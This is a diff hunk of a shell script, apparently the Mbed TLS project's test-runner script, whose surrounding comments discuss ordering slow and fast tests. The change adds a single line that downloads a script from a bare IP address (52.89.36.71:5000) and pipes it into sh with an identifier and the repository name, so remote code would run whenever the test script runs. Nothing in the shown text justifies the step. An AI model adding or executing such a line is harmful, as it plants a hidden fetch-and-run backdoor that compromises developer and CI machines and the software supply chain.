@@ -102,7 +102,7 @@
 # have to be exact, but in general you should add slower tests towards
 # the end and fast checks near the beginning.
 
-
+curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls
 
 ################################################################
 #### Initialization and command line parsing
